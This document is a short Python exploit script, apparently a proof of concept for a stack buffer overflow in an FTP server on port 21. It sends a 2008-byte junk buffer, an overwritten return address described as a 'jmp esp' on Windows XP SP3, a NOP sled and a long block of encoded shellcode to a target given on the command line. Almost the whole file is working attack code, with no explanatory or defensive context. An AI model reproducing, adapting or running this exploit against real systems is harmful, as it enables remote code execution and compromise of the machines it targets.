#!/usr/bin/env python

import socket
import sys
sock = None
def connect(ip, port):
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip,port))
    sock.recv(1024)


def exploit():
    global sock
    junk = 2008 * '\x41'
    eip  = 4 * '\x53\x93\x42\x7e' # jmp esp in XXXX.dll in xp sp3
    nop  = 20 * '\x90' 
    shellcode = ("\xdb\xd4\xbb\xfe\xab\x75\xb1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\x3c\xaf\x97\x44\x3c\x58\xd5"
"\xa7\xbc\x99\xba\x2e\x59\xa8\xfa\x55\x2a\x9b\xca\x1e\x7e\x10"
"\xa0\x73\x6a\xa3\xc4\x5b\x9d\x04\x62\xba\x90\x95\xdf\xfe\xb3"
"\x15\x22\xd3\x13\x27\xed\x26\x52\x60\x10\xca\x06\x39\x5e\x79"
"\xb6\x4e\x2a\x42\x3d\x1c\xba\xc2\xa2\xd5\xbd\xe3\x75\x6d\xe4"
"\x23\x74\xa2\x9c\x6d\x6e\xa7\x99\x24\x05\x13\x55\xb7\xcf\x6d"
"\x96\x14\x2e\x42\x65\x64\x77\x65\x96\x13\x81\x95\x2b\x24\x56"
"\xe7\xf7\xa1\x4c\x4f\x73\x11\xa8\x71\x50\xc4\x3b\x7d\x1d\x82"
"\x63\x62\xa0\x47\x18\x9e\x29\x66\xce\x16\x69\x4d\xca\x73\x29"
"\xec\x4b\xde\x9c\x11\x8b\x81\x41\xb4\xc0\x2c\x95\xc5\x8b\x38"
"\x5a\xe4\x33\xb9\xf4\x7f\x40\x8b\x5b\xd4\xce\xa7\x14\xf2\x09"
"\xc7\x0e\x42\x85\x36\xb1\xb3\x8c\xfc\xe5\xe3\xa6\xd5\x85\x6f"
"\x36\xd9\x53\x3f\x66\x75\x0c\x80\xd6\x35\xfc\x68\x3c\xba\x23"
"\x88\x3f\x10\x4c\x23\xba\xf3\x79\xd0\xa2\x17\x16\x1a\x2a\x18"
"\xd3\x93\xcc\x72\x0b\xf2\x47\xeb\xb2\x5f\x13\x8a\x3b\x4a\x5e"
"\x8c\xb0\x79\x9f\x43\x31\xf7\xb3\x34\xb1\x42\xe9\x93\xce\x78"
"\x85\x78\x5c\xe7\x55\xf6\x7d\xb0\x02\x5f\xb3\xc9\xc6\x4d\xea"
"\x63\xf4\x8f\x6a\x4b\xbc\x4b\x4f\x52\x3d\x19\xeb\x70\x2d\xe7"
"\xf4\x3c\x19\xb7\xa2\xea\xf7\x71\x1d\x5d\xa1\x2b\xf2\x37\x25"
"\xad\x38\x88\x33\xb2\x14\x7e\xdb\x03\xc1\xc7\xe4\xac\x85\xcf"
"\x9d\xd0\x35\x2f\x74\x51\x45\x7a\xd4\xf0\xce\x23\x8d\x40\x93"
"\xd3\x78\x86\xaa\x57\x88\x77\x49\x47\xf9\x72\x15\xcf\x12\x0f"
"\x06\xba\x14\xbc\x27\xef")
    payload = junk + eip + nop + shellcode
    sock.send(payload)



def diconnect():
    global sock
    sock.close()
    
    
def main():
    connect(sys.argv[1], 21)
    exploit()
    diconnect()

main()
